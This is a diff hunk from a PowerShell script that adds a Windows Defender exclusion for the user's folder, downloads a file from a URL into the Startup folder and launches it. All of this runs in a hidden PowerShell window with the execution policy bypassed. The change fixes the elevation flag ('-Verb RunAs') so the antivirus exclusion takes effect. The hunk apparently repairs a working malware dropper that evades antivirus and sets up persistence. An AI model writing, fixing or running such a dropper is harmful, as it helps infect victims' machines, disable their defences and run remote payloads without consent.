@@ -4,4 +4,4 @@ $startupFilePath = "$userDirectory\AppData\Roaming\Microsoft\Windows\Start Menu\
 $downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startupFilePath'"
 $exclusionCommand = "Add-MpPreference -ExclusionPath '$userDirectory'"
 $startupCommand = "Start-Process '$startupFilePath'"
-Start-Process powershell -Verb -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($exclusionCommand); `$($downloadCommand); `$($startupCommand)"
+Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($exclusionCommand); `$($downloadCommand); `$($startupCommand)"
